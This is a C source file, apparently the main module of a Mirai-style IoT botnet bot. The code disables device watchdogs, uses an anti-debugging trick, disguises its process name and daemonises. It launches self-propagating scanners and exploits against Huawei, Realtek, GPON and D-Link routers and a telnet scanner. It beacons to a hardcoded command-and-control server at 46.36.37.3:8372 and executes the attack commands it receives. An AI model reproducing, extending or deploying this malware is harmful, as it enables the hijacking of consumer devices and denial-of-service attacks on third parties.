#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "killer.h"
#include "util.h"
#include "resolv.h"
#include "scanner.h"
#include "huawei_scanner.h"
#include "exploit.h"
#include "dlink_scanner.h"
#include "gpon8080_scanner.h"
#include "realtek_scanner.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

int main(int argc, char **args)
{
	int wfd[7] = {0};
	int one = 1;
	int found = FALSE;
	
	table_unlock_val(TABLE_MISC_DOG);
	table_unlock_val(TABLE_MISC_DOG1);
	table_unlock_val(TABLE_MISC_DOG2);
	table_unlock_val(TABLE_MISC_DOG3);
	table_unlock_val(TABLE_MISC_DOG4);
	table_unlock_val(TABLE_MISC_DOG5);
	table_unlock_val(TABLE_MISC_DOG6);
if ((wfd[0] = open(table_retrieve_val(TABLE_MISC_DOG, NULL), 2)) != -1 ||
    (wfd[1] = open(table_retrieve_val(TABLE_MISC_DOG1, NULL), 2)) != -1 ||
    (wfd[2] = open(table_retrieve_val(TABLE_MISC_DOG2, NULL), 2)) != -1 ||
	(wfd[3] = open(table_retrieve_val(TABLE_MISC_DOG3, NULL), 2)) != -1 ||
	(wfd[4] = open(table_retrieve_val(TABLE_MISC_DOG4, NULL), 2)) != -1 ||
	(wfd[5] = open(table_retrieve_val(TABLE_MISC_DOG5, NULL), 2)) != -1 ||
    (wfd[6] = open(table_retrieve_val(TABLE_MISC_DOG6, NULL), 2)) != -1)
    {
		found = TRUE;
        ioctl(wfd[0], 0x80045704, &one);
		ioctl(wfd[1], 0x80045704, &one);
		ioctl(wfd[2], 0x80045704, &one);
		ioctl(wfd[3], 0x80045704, &one);
		ioctl(wfd[4], 0x80045704, &one);
		ioctl(wfd[5], 0x80045704, &one);
		ioctl(wfd[6], 0x80045704, &one);
    }
	if(found)
    {
        while(TRUE)
        {
            ioctl(wfd[0], 0x80045705, 0);
			ioctl(wfd[1], 0x80045705, 0);
			ioctl(wfd[2], 0x80045705, 0);
			ioctl(wfd[3], 0x80045705, 0);
			ioctl(wfd[4], 0x80045705, 0);
			ioctl(wfd[5], 0x80045705, 0);
			ioctl(wfd[6], 0x80045705, 0);
            sleep(3);
        }
    }
	table_lock_val(TABLE_MISC_DOG);
	table_lock_val(TABLE_MISC_DOG1);
	table_lock_val(TABLE_MISC_DOG2);
	table_lock_val(TABLE_MISC_DOG3);
	table_lock_val(TABLE_MISC_DOG4);
	table_lock_val(TABLE_MISC_DOG5);
	table_lock_val(TABLE_MISC_DOG6);
	
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);
    #endif

    #ifdef DEBUG
	
        sleep(1);

        struct sigaction sa;

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGSEGV, &sa, NULL) == -1)
            perror("sigaction");

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGBUS, &sa, NULL) == -1)
            perror("sigaction");
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);
    rand_init();

    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    util_zero(name_buf, 32);

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

	attack_init();
	
#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif
	
#ifdef ICY
    killer_init();
#endif

#ifdef SELFREP
	huaweiscanner_scanner_init();
	exploit_init();
	realtekscanner_scanner_init();
	gpon8080_scanner();
	dlinkscanner_scanner_init();
#endif

#ifdef TELNET
	scanner_init();
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
			#ifdef DEBUG
            printf("[main] detected newer instance running! Killing self\n");
			#endif
			#ifdef ICY
			killer_kill();
			#endif
#			ifdef TELNET
			scanner_kill();
			#endif
			#ifdef SELFREP
			huaweiscanner_scanner_kill();
			exploit_kill();
			realtekscanner_scanner_kill();
			gpon8080_kill();
			dlinkscanner_scanner_kill();
			#endif
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }
        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                teardown_connection();
                continue;
            }

            if(len == 0) 
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL); 
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            if(len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}
static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
	
    srv_addr.sin_addr.s_addr = INET_ADDR(46,36,37,3);
    srv_addr.sin_port = htons(8372);

}

static void establish_connection(void)
{
    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}
